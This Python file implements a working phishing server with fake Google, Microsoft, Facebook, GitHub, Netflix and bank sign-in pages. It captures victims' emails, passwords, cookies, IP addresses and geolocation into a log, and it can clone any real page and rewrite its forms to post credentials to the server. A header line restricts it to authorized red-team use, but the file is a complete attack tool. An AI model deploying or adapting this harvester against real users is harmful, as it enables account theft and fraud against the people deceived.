#!/usr/bin/env python3
"""
=============================================================================
  phishing_page.py — Multi-template phishing server
  Part of: PARALELEPIPEDO // SocialEngineering
  Author : PARALELEPIPEDO project
  Use    : Authorized red-team / security-awareness testing only
=============================================================================
  Deps: flask, requests, beautifulsoup4, rich, colorama, pyopenssl
        pip install flask requests beautifulsoup4 rich colorama pyopenssl
=============================================================================
"""

import argparse
import json
import os
import ssl
import sys
import threading
import time
from datetime import datetime, timezone
from pathlib import Path
import socket
import tempfile

import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init as colorama_init
from flask import Flask, request, redirect, render_template_string, Response
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.panel import Panel

colorama_init(autoreset=True)
console = Console()

BASE_DIR = Path(__file__).parent
LOG_FILE  = BASE_DIR / "captures.json"

# ─── Built-in templates ───────────────────────────────────────────────────────

TEMPLATES = {
    "google": """<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Google – Sign in</title>
<style>
  body{font-family:Arial,sans-serif;background:#fff;display:flex;justify-content:center;padding-top:80px}
  .card{width:360px;border:1px solid #dadce0;border-radius:8px;padding:40px 40px 36px}
  .logo{text-align:center;margin-bottom:24px;font-size:24px;color:#202124}
  .logo span{color:#4285f4}
  h1{font-size:24px;font-weight:400;margin:0 0 8px}
  p{color:#5f6368;font-size:14px;margin:0 0 28px}
  input{width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:16px}
  .btn{width:100%;background:#1a73e8;color:#fff;border:none;padding:12px;border-radius:4px;font-size:14px;cursor:pointer}
  .btn:hover{background:#1765cc}
</style></head><body>
<div class="card">
  <div class="logo"><b>G</b><span>o</span><span style="color:#ea4335">o</span><span>g</span><span style="color:#fbbc04">l</span><span style="color:#34a853">e</span></div>
  <h1>Sign in</h1><p>Use your Google Account</p>
  <form method="POST" action="/capture">
    <input type="email"    name="email"    placeholder="Email or phone"    required><br>
    <input type="password" name="password" placeholder="Enter your password" required>
    <button class="btn" type="submit">Next</button>
  </form>
</div></body></html>""",

    "microsoft": """<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Sign in – Microsoft</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh}
  .card{background:#fff;width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
  img.logo{width:108px;margin-bottom:16px}
  h1{font-size:24px;font-weight:600;margin-bottom:16px}
  input{width:100%;border:none;border-bottom:1px solid #666;padding:10px 0;font-size:14px;outline:none;margin-bottom:20px}
  .btn{background:#0067b8;color:#fff;border:none;width:100%;padding:12px;font-size:14px;cursor:pointer}
  .btn:hover{background:#005da6}
</style></head><body>
<div class="card">
  <div style="font-size:30px;font-weight:700;color:#0067b8;margin-bottom:12px">Microsoft</div>
  <h1>Sign in</h1>
  <form method="POST" action="/capture">
    <input type="email"    name="email"    placeholder="Email, phone, or Skype" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Sign in</button>
  </form>
</div></body></html>""",

    "facebook": """<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Facebook – Log in</title>
<style>
  body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;margin:0}
  .top{background:#1877f2;padding:20px 0;text-align:center;color:#fff;font-size:36px;font-weight:700}
  .center{display:flex;justify-content:center;margin-top:40px}
  .card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);padding:20px;width:360px}
  input{width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;box-sizing:border-box}
  .btn{background:#1877f2;color:#fff;border:none;width:100%;padding:14px;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer}
  .btn:hover{background:#166fe5}
</style></head><body>
<div class="top">facebook</div>
<div class="center"><div class="card">
  <form method="POST" action="/capture">
    <input type="email"    name="email"    placeholder="Email address or phone number" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Log in</button>
  </form>
</div></div></body></html>""",

    "github": """<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Sign in to GitHub</title>
<style>
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f6f8fa;display:flex;flex-direction:column;align-items:center;padding-top:60px}
  .logo{font-size:48px;margin-bottom:16px}
  h1{font-size:24px;font-weight:300;margin-bottom:16px}
  .card{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:20px;width:340px}
  label{font-size:14px;font-weight:600;display:block;margin-bottom:4px}
  input{width:100%;padding:8px 12px;border:1px solid #d0d7de;border-radius:6px;font-size:14px;box-sizing:border-box;margin-bottom:16px}
  .btn{background:#2da44e;color:#fff;border:none;width:100%;padding:10px;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer}
  .btn:hover{background:#2c974b}
</style></head><body>
<div class="logo">&#128008;</div><h1>Sign in to GitHub</h1>
<div class="card">
  <form method="POST" action="/capture">
    <label>Username or email address</label>
    <input type="text"     name="email"    required>
    <label>Password</label>
    <input type="password" name="password" required>
    <button class="btn" type="submit">Sign in</button>
  </form>
</div></body></html>""",

    "netflix": """<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Netflix – Sign In</title>
<style>
  body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:'Netflix Sans',Helvetica,Arial,sans-serif}
  .logo{color:#e50914;font-size:48px;font-weight:700;position:absolute;top:24px;left:40px}
  .card{background:rgba(0,0,0,.75);padding:60px 68px;border-radius:4px;width:340px}
  h1{color:#fff;font-size:32px;font-weight:700;margin-bottom:28px}
  input{width:100%;background:#333;border:none;border-radius:4px;color:#fff;padding:16px 20px;font-size:16px;margin-bottom:16px;box-sizing:border-box}
  .btn{background:#e50914;color:#fff;border:none;width:100%;padding:16px;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer}
  .btn:hover{background:#c11119}
</style></head><body>
<div class="logo">NETFLIX</div>
<div class="card">
  <h1>Sign In</h1>
  <form method="POST" action="/capture">
    <input type="email"    name="email"    placeholder="Email or phone number" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Sign In</button>
  </form>
</div></body></html>""",

    "bank": """<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>SecureBank – Online Banking</title>
<style>
  body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
  .header{background:#003366;color:#fff;padding:16px 32px;font-size:22px;font-weight:700;position:absolute;top:0;width:100%;box-sizing:border-box}
  .card{background:#fff;padding:40px;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.15);width:380px;text-align:center}
  .card h2{color:#003366;margin-bottom:24px}
  input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:15px;margin-bottom:16px;box-sizing:border-box}
  .btn{background:#003366;color:#fff;border:none;width:100%;padding:14px;border-radius:4px;font-size:15px;cursor:pointer}
  .btn:hover{background:#002244}
  .secure{color:#888;font-size:12px;margin-top:12px}
</style></head><body>
<div class="header">&#127968; SecureBank</div>
<div class="card">
  <h2>Online Banking Sign-In</h2>
  <form method="POST" action="/capture">
    <input type="text"     name="email"    placeholder="User ID / CPF / Email" required>
    <input type="password" name="password" placeholder="Password / Token" required>
    <button class="btn" type="submit">Enter Secure Area</button>
  </form>
  <p class="secure">&#128274; 256-bit SSL encrypted connection</p>
</div></body></html>""",
}

# ─── Globals ──────────────────────────────────────────────────────────────────

app      = Flask(__name__)
captures = []          # list of capture dicts
args_g   = None        # global parsed args
rich_table = None      # updated by Live

# ─── Helpers ──────────────────────────────────────────────────────────────────

def get_geo(ip: str) -> dict:
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp,query",
                         timeout=4)
        return r.json() if r.status_code == 200 else {}
    except Exception:
        return {}


def log_capture(entry: dict):
    captures.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(captures, f, indent=2, default=str)


def build_table() -> Table:
    t = Table(title="[bold red]⚡ Captured Credentials[/]", expand=True)
    t.add_column("Time",       style="cyan",  no_wrap=True)
    t.add_column("IP",         style="green")
    t.add_column("Location",   style="yellow")
    t.add_column("Email",      style="magenta")
    t.add_column("Password",   style="red")
    t.add_column("UA",         style="dim",   overflow="fold")
    for c in captures[-20:]:
        geo = c.get("geo", {})
        loc = f"{geo.get('city','?')}, {geo.get('country','?')}"
        t.add_row(
            c.get("timestamp",""),
            c.get("ip",""),
            loc,
            c.get("email",""),
            c.get("password",""),
            c.get("user_agent","")[:60],
        )
    return t


# ─── Rate limiting ─────────────────────────────────────────────────────────────

from collections import defaultdict
_rate: dict = defaultdict(list)
RATE_LIMIT  = 20  # requests per minute per IP

def is_rate_limited(ip: str) -> bool:
    now = time.time()
    _rate[ip] = [t for t in _rate[ip] if now - t < 60]
    if len(_rate[ip]) >= RATE_LIMIT:
        return True
    _rate[ip].append(now)
    return False


# ─── Routes ───────────────────────────────────────────────────────────────────

@app.route("/", methods=["GET"])
def index():
    if is_rate_limited(request.remote_addr):
        return "Too many requests", 429
    return render_template_string(app.config["PAGE_HTML"])


@app.route("/capture", methods=["POST"])
def capture():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if is_rate_limited(ip):
        return "Too many requests", 429

    # Parse form or JSON
    if request.is_json:
        data = request.get_json(silent=True) or {}
        email    = data.get("email", data.get("username", ""))
        password = data.get("password", "")
        cookies  = {}
    else:
        email    = request.form.get("email", request.form.get("username", ""))
        password = request.form.get("password", "")
        cookies  = dict(request.cookies)

    geo = get_geo(ip)

    entry = {
        "timestamp"  : datetime.now(timezone.utc).isoformat(),
        "ip"         : ip,
        "user_agent" : request.headers.get("User-Agent", ""),
        "email"      : email,
        "password"   : password,
        "cookies"    : cookies,
        "geo"        : geo,
        "referer"    : request.headers.get("Referer", ""),
    }
    log_capture(entry)

    # Console flash
    console.print(Panel(
        f"[bold green]NEW CAPTURE[/]\n"
        f"IP: [cyan]{ip}[/] | Geo: [yellow]{geo.get('city','?')}, {geo.get('country','?')}[/]\n"
        f"Email: [magenta]{email}[/] | Pass: [red]{password}[/]",
        title="[bold red]⚡ Credential Captured[/]",
        border_style="red",
    ))

    redirect_url = args_g.redirect or "https://www.google.com"
    return redirect(redirect_url)


# ─── Clone mode ───────────────────────────────────────────────────────────────

def clone_page(url: str) -> str:
    console.print(f"[cyan]Cloning:[/] {url}")
    r = requests.get(url, timeout=10,
                     headers={"User-Agent": "Mozilla/5.0 (compatible)"})
    soup = BeautifulSoup(r.text, "html.parser")
    # Patch all forms to POST /capture
    for form in soup.find_all("form"):
        form["method"] = "POST"
        form["action"] = "/capture"
    # Inject credential fields if no password input found
    if not soup.find("input", {"type": "password"}):
        form = soup.find("form") or soup.new_tag("form", method="POST", action="/capture")
        pi = soup.new_tag("input", type="password", name="password",
                          placeholder="Password", required=True)
        form.append(pi)
    return str(soup)


# ─── SSL self-signed ───────────────────────────────────────────────────────────

def make_ssl_context():
    try:
        from OpenSSL import crypto
    except ImportError:
        console.print("[yellow]pyopenssl not installed – running HTTP only[/]")
        return None

    key  = crypto.PKey()
    key.generate_key(crypto.TYPE_RSA, 2048)
    cert = crypto.X509()
    cert.get_subject().CN = "localhost"
    cert.set_serial_number(1000)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(365 * 24 * 3600)
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(key)
    cert.sign(key, "sha256")

    tmp = tempfile.mkdtemp()
    cert_file = os.path.join(tmp, "cert.pem")
    key_file  = os.path.join(tmp, "key.pem")
    with open(cert_file, "wb") as f:
        f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
    with open(key_file,  "wb") as f:
        f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert_file, key_file)
    return (cert_file, key_file)


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    global args_g

    parser = argparse.ArgumentParser(
        description="Multi-template phishing server",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--template", choices=list(TEMPLATES.keys()),
                        default="google", help="Built-in template to use")
    parser.add_argument("--clone",    metavar="URL",
                        help="Clone a real page (overrides --template)")
    parser.add_argument("--port",     type=int, default=8080)
    parser.add_argument("--host",     default="0.0.0.0")
    parser.add_argument("--redirect", metavar="URL",
                        help="Redirect victim after credential capture")
    parser.add_argument("--https",    action="store_true",
                        help="Enable HTTPS with self-signed cert")
    parser.add_argument("--log",      default=str(LOG_FILE),
                        help="JSON log output path")
    args_g = parser.parse_args()

    global LOG_FILE
    LOG_FILE = Path(args_g.log)

    # Build HTML
    if args_g.clone:
        html = clone_page(args_g.clone)
    else:
        html = TEMPLATES[args_g.template]

    app.config["PAGE_HTML"] = html

    proto = "https" if args_g.https else "http"
    my_ip = socket.gethostbyname(socket.gethostname())
    console.print(Panel(
        f"[bold]Template :[/] {args_g.clone or args_g.template}\n"
        f"[bold]Listen   :[/] {proto}://{args_g.host}:{args_g.port}\n"
        f"[bold]LAN URL  :[/] {proto}://{my_ip}:{args_g.port}\n"
        f"[bold]Log      :[/] {LOG_FILE}\n"
        f"[bold]Redirect :[/] {args_g.redirect or 'none (stays on page)'}",
        title="[bold red]⚡ Phishing Server[/]",
        border_style="red",
    ))

    ssl_args = {}
    if args_g.https:
        pair = make_ssl_context()
        if pair:
            ssl_args = {"ssl_context": pair}

    import logging
    log = logging.getLogger("werkzeug")
    log.setLevel(logging.ERROR)

    app.run(host=args_g.host, port=args_g.port, debug=False, **ssl_args)


if __name__ == "__main__":
    main()
